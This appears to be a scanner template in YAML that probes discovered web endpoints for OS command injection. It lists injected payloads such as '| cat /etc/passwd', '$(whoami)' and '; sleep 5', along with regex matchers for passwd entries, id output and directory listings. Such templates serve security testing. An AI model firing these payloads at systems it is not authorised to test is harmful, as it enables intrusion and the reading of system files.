id: generic-command-injection
info:
  name: Command Injection
  description: Tests for OS command injection in discovered endpoints
  owasp_category: A03:2021
  severity: critical
  tags:
    - command
    - rce
    - injection
    - generic

generic:
  endpoint: "{{all_discovered}}"
  method: "{{method}}"
  parameter: "{{input_param}}"

  payloads:
    - "; ls -la"
    - "| cat /etc/passwd"
    - "& whoami"
    - "`id`"
    - "$(whoami)"
    - "' && ping -c 1 localhost && echo '"
    - "; sleep 5"
    - "| dir"
    - "& type C:\\Windows\\win.ini"
    - "`whoami`"
    - "$(id)"
    - "; nslookup test"
    - "| nslookup test"
    - "& ping -n 3 test"

  matchers:
    - type: status
      condition: in
      status:
        - 200
        - 500
    - type: regex
      condition: or
      regex:
        - 'root:x:[0-9]+:[0-9]+:'
        - 'uid=[0-9]+\(\w+\)'
        - 'gid=[0-9]+\(\w+\)'
        - 'total [0-9]+'
        - 'drwx'
        - '-rw-'
        - 'PING.*bytes of data'
        - '[0-9]+ packets transmitted'
        - '/bin/bash'
        - '/bin/sh'
        - 'sh-[0-9.]+'
        - '\[extensions?~\]'
        - 'Volume Serial Number'
        - 'Directory of C:\\'

  matchers_condition: or
